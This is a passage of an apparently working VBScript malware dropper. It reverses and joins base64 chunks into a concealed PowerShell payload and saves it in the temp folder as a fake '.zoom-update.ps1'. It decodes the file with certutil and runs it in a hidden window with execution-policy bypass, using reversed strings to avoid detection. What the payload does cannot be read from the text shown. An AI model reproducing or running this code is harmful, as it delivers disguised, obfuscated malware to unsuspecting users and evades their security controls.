    "gAiCNkCKlN3bwNXaE5SbhVmc0NlenRCI7kCKlN3bwNXaE5Cc", _
    "vNkLt9GRlR2bD5SblR3c5NFI0NWZqJ2TtcXZOBSPgA3YkACI", _
    "H5CcjRCIgACIK0wcyVGdl1WYyFGUyVGbpBXbvNkLyVGbpBXb", _
    "uV2RuA3YkACIgAiCNUWdyRHJg0DI5J3btVWTulUZ0Fmcl5WZ", _
    "vNkLwNGJgACIgoQDlNHbhZGJg0DIlxmYhRXdjVGeFVGdhJXZ", _
    "oAEIgACIK0wJrUmep1Wa0B3bvcCI9Aycu9Wa0B3TyVGbpBXb", _
    "0NXeTdCLnwGbk5SZy92Qu0WZ0NXeTdCLnwGbk5SblR3c5N1J", _
    "k5CcyFGaTNkL0Z2bz9mcjlWTnwyJsxGZukHdpJXdjV2Uu0WZ", _
    "vZ3WgACIgACIgAiCNsHI0NWZqJ2Ttg2YhVkcvZEI8BSKnwGb", _
    "NkyXkgCZkFkLzVWasJWblN3cBRWZj5WZyVmZlJlLwNGJdRWa", _
    "NBCdjVmai9UL3VmTg0DIyVGZpZ3byBHJgACIgoQD9BCIgAiC", _
    "K0gclRWa29mcQVGZvNEcyFGaTNkLwJXYoN1QuQnZvN3byNWa", _
    "tV2czFUZslGct92QuIXZklmdvJHckASPgQHb1NXZyRCIgACI", _
    "gYWagACIgoQDpU2YyV3bzRCIsA3YkgSZjJXdvNVbvJnR5xmY", _
    "gACIgoQD7BSKwACdn1CI05WdvNkLzJ3byJXRuQHb1NXZyRCK", _
    "gUGJoACajFWZy9mZgACIgACIgAiCNcyJg0DI0hXZ0RCIgACI", _
    "T9GVuUGJg0zKgQHelRHJgsHIpMncvJncF5CdsV3clJHJg4Wa", _
    "lxWaG5yTJtFIgACIgACIgoQD9BiIuBmcgJCIrASKocmbpJHd", _
    "Q1URUpjduVGJggGdhBVLul2bKhCK0hXZUxGbBVGdpJ3V6oTX", _
    "gACIK0QK0hXZ0RCIskyJn9GbuwGblh2cyV2dvBXLt92b6dCI", _
    "zVmckASPgUGc5RHJgACIgoQD9BCIgAiCNIDI0lGelBCIgACI", _
    "vxUbv9mWngSZwlHV0V2RukHbi1WZzNXQkVGbpBXbvNkL0xWd", _
    "vhGdl1EdldkLlBXe0RCI9ACZvhGdl1GJgACIgoQDpciclRWY", _
    "E9UTf10TPplO25WZkASPgUGZv1GJgACIgoQDpcibpFWTngCZ", _
    "kgSe0BXbFJ3TsxWdONXS6oTXn5WayR3cbhCImlGIgACIK0QR", _
    "pRCIgACIK0QfgcCbsFGdz5WanASPgUGZv1GJgsHIpkSZk9Wb", _
    "NEDIn01W0NWZqJ2bnACdjVmai9UL3VmTg0DIzdmcBV2avZnb", _
    "tRCKA1VXbdmbpJHdztFI9ASXws1cnJXQlt2b25WakACIgAiC", _
    "15GJoU2avZnbJ5CZvhGdl1GJg0DIlR2bjRCIgACIK0QKlR2b", _
    "k92Yk0Fdul2WgQXa4VGIgACIK0QKzdmcBV2avZnbpRCIswGb", _
    "Pl0WgACIgACIgAiCNsHI5JHdgACIgoQD7BCajRXYjBSfK0QZ", _
    "25WZkACa0FGUt4WavpEKoQHelRFbsFUZ0lmcXpjOdVGbpZkL", _
    "T9GVu8FJgwSKnc2bs5CbsVGazJXZ39Gct02bvp3JgAVTFRlO", _
    "xACdphXZgACIgoQD9tHIoNGdhNGI9BCIgAiCNkSKocmbpJHd", _
    "9pQD" _
)

b64 = ""
For i = 0 To UBound(chunks)
    b64 = b64 & Rev(chunks(i))
Next

' powershell.exe assembled from reversed fragments.
psExe = U(Array("llehsrewop", ".", "exe"))
psFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\.zoom-update.ps1"
b64File = sh.ExpandEnvironmentStrings("%TEMP%") & "\.zoom-update.b64"
Set st = CreateObject("ADODB.Stream")
st.Type = 2
st.Charset = "ascii"
st.Open
st.WriteText b64
st.SaveToFile b64File, 2
st.Close
Set st = Nothing
sh.Run "certutil.exe -f -decode """ & b64File & """ """ & psFile & """", 0, True
fso.DeleteFile b64File, True
psCmd = psExe & " -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psFile & """"

On Error Resume Next
waitMode = (mode = "selftest")
rc = sh.Run(psCmd, 0, waitMode)
If Err.Number <> 0 Then
    rc = 1
    Err.Clear
End If

If mode = "selftest" Then
    logPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\zoom-selftest.log"
    If fso.FileExists(logPath) Then
        WScript.Echo fso.OpenTextFile(logPath, 1).ReadAll
    End If
    WScript.Echo "dropper_exit=" & rc
End If

Function Rev(value)
    Rev = StrReverse(value)
End Function

Function U(parts)
    Dim j
    U = ""
    For j = 0 To UBound(parts)
        U = U & StrReverse(parts(j))
    Next
End Function

Function IIf(condition, whenTrue, whenFalse)
    If condition Then
        IIf = whenTrue
    Else
        IIf = whenFalse
    End If
End Function
